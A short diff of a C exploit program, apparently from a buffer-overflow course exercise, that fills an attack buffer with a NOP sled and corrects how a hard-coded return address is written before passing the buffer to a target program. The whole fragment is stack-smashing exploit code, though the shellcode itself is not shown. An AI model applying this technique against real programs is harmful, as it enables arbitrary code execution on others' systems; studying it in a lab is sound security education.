@@ -22,8 +22,8 @@ main ( int argc, char * argv[] )
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
-	char * ret_address = &attack_buffer[BUF_TO_RET];
-	*ret_address = (char*)0x2021fe10;
+	int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
+	*ret_address = 0x2021fe10;
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
